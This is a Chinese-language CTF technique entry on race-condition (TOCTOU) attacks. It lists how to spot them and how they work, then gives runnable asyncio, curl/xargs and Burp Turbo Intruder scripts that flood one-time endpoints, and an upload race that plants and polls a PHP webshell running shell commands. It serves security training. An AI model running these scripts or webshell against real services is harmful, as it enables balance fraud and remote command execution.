---
title: 条件竞争（Race Condition）利用
category: web
tags: [条件竞争, race condition, toctou, 并发]
signals: [并发, 兑换码, 提现, 投票, 只允许操作一次, 检查和使用之间有间隔, 上传后删除, 抢购, 多次领取, 并发请求]
difficulty: medium
source: "PortSwigger / PayloadsAllTheThings"
tools: [python, burpsuite turbo intruder, asyncio]
updated: 2026-10-22
---

## 一、识别信号（题面长什么样）

- "每天只能领取一次"、"只能兑换一次"、"余额不足"但并发后余额为负。
- 抽奖、抢购、转账：`if (balance >= amount) { balance -= amount; }` 而非原子操作。
- 上传后立即删除：`move_uploaded_file` 后 `unlink`，之间有窗口。
- 投票/点赞：同一用户并发多次。

## 二、原理

检查（check）与使用（use）之间存在时间窗口（TOCTOU）。若两个请求在"检查通过后、状态写入前"同时进入临界区，两次都会通过检查。

- **Limit Overrun**（限制溢出）：优惠券只能用一个，并发提交上百次 → 都成功。
- **多线程 SQL 余额**：`UPDATE balance = balance - 1 WHERE balance > 0` 是原子的；而 `SELECT` 再 `UPDATE` 不是。
- **文件上传竞争**：上传→检查→删除，窗口内访问 shell 成功。
- **session/文件写竞争**：`file_put_contents` 前 `fopen` 再 `unlink` 的临时文件残留。

## 三、解题步骤

1. 找到"只允许一次"的接口。
2. 用并发工具同时打（`asyncio`/`xargs -P`/Burp Repeater 多线程）。
3. 观察响应：多个 success / 余额异常。
4. 上传类：用长连接持续请求上传文件名，同时不断访问。
5. 拿到 flag（如领到 100 次奖励换 flag）。

## 四、可直接运行的脚本

并发领取（Python asyncio，避免线程开销）：

```python
import asyncio, aiohttp

URL = "http://TARGET/api/claim"
COOKIE = {"session": "YOUR_SESSION"}
N = 200

async def claim(session, i):
    async with session.post(URL, cookies=COOKIE) as r:
        txt = await r.text()
        return r.status, txt[:80]

async def main():
    conn = aiohttp.TCPConnector(limit=0)     # 不限并发
    async with aiohttp.ClientSession(connector=conn) as s:
        results = await asyncio.gather(*[claim(s, i) for i in range(N)])
    ok = [r for r in results if r[0] == 200]
    print("成功次数:", len(ok))
    for r in ok[:10]:
        print(r)

asyncio.run(main())
```

curl + xargs 版（无第三方库）：

```bash
seq 1 200 | xargs -P 200 -I{} \
  curl -s -b "session=YOUR_SESSION" -X POST "http://TARGET/api/claim" -o /dev/null
```

Burp 一键多线程（单包 attack）：

```text
1. 抓包 → Send to Intruder
2. Attack type: Sniper，Payloads: 1 个
3. Intruder → Options → Request Engine：
   Number of threads: 30
   Number of retries: 0
4. Start attack，看 Response 里出现多个成功
```

文件上传竞争（上传后立即删）：

```python
import threading, requests, time

UPLOAD = "http://TARGET/upload.php"
SHELL  = "http://TARGET/uploads/shell.php"
PAYLOAD = b"<?php echo 'PWN'; system($_GET['c']); ?>"
stop = False

def up():
    while not stop:
        try:
            requests.post(UPLOAD, files={"file": ("shell.php", PAYLOAD)}, timeout=3)
        except Exception:
            pass

def hit():
    while not stop:
        try:
            r = requests.get(SHELL + "?c=id", timeout=2)
            if r.status_code == 200 and b"PWN" in r.content:
                print("HIT:", r.text[:200])
        except Exception:
            pass

threads = [threading.Thread(target=up) for _ in range(20)]
threads += [threading.Thread(target=hit) for _ in range(20)]
for t in threads: t.start()
time.sleep(60)
stop = True
```

PHP 临时文件竞争（`php://` + LFI 包含 `phpXXXXXX`）：

```python
import requests, threading

# 思路：PHP 上传时文件先落 /tmp/phpXXXXXX，脚本结束前访问
# 配合 LFI：?file=/tmp/phpXXXXXX 需要猜名字（6 位随机）
# 更快：用 session.upload_progress + 包含 session 文件（见 lfi-rfi-and-log-poisoning.md）

def upload():
    while True:
        requests.post("http://TARGET/upload.php",
                      files={"file": ("x.php", "<?php system($_GET['c']); ?>")},
                      timeout=2)
```

Burp Turbo Intruder 脚本（单包多路，最适合 race）：

```python
# Turbolistener / Turbo Intruder 里的脚本
def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint,
                           concurrentConnections=30,
                           engine=Engine.BURP2)
    for i in range(100):
        engine.queue(target.req, gate='race1')
    engine.openGate('race1')     # 一次性放行，最大化并发

def handleResponse(req, interesting):
    if 'success' in req.response.decode(errors='ignore'):
        table.add(req)
```

`xargs -P` 打表单：

```bash
seq 1 300 | xargs -P 100 -I{} \
  curl -s -X POST "http://TARGET/vote" -d "candidate=1&uid={}" -o /dev/null -w "%{http_code}\n" | sort | uniq -c
```

## 五、常见坑 / 变体

- **数据库层面原子性**：如果后端是 `UPDATE ... WHERE balance >= 1` 且开了事务隔离，竞争无效；需要看代码。
- **限流/WAF**：并发太高可能被 429，降低线程数或加随机延迟重试。
- **`asyncio` + aiohttp 的默认连接池**：`TCPConnector(limit=0)` 才真无限并发；HTTP/2 时更要注意。
- **窗口太小**：文件上传竞争可能只有几毫秒，持续跑几分钟。
- 变体：**HTTP/2 单包攻击**（Single-packet attack，Burp 新功能）—— 把多个请求塞在同一 TCP 包里。
- 变体：**TOCTOU 的符号链接**：`/tmp/link -> /etc/passwd` 在检查后被替换。
- 变体：**并发注册同名用户**（`INSERT` 前的查重），拿到重复账号。
- 变体：**邮件验证码竞争**：并发提交多个验证码，总有一个命中。

## 六、参考来源

- [PortSwigger Web Security Academy - Race conditions](https://portswigger.net/web-security/race-conditions)
- [PayloadsAllTheThings - Race Condition](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Race%20Condition)
- [PortSwigger Research - Smashing the state machine (single-packet attack)](https://portswigger.net/research/smashing-the-state-machine)
- [HackTricks - Race Condition](https://book.hacktricks.wiki/en/pentesting-web/race-condition.html)
